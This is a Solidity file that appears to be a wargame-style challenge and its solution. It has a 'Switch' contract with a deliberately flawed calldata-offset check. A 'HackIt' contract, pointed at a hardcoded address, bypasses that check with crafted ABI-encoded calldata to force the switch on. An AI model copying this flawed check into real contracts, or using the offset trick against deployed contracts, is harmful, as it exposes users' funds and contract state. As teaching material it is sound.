// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        console.log("in modifier");
        console.logBytes(msg.data);
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)

        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        console.logBytes4(bytes4(selector[0]));
        console.logBytes4(offSelector);
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

contract HackIt {
    address targetContract = 0x292b69b58d8B81025F89335bAF3bcAdF9dB8adcF;

    function switchOn() external returns (bytes memory) {
        bytes memory data = abi.encodePacked(
            Switch.flipSwitch.selector,
            abi.encode(
                uint32(96),
                uint32(0),
                bytes4(Switch.turnSwitchOff.selector),
                uint32(4),
                bytes4(Switch.turnSwitchOn.selector)
            )
        );
        address(targetContract).call(data);
        return data;
    }

    function switchOff() external {
        Switch switchh = Switch(targetContract);
        bytes memory _data = abi.encodeWithSelector(Switch.turnSwitchOff.selector);
        switchh.flipSwitch(_data);
    }
}
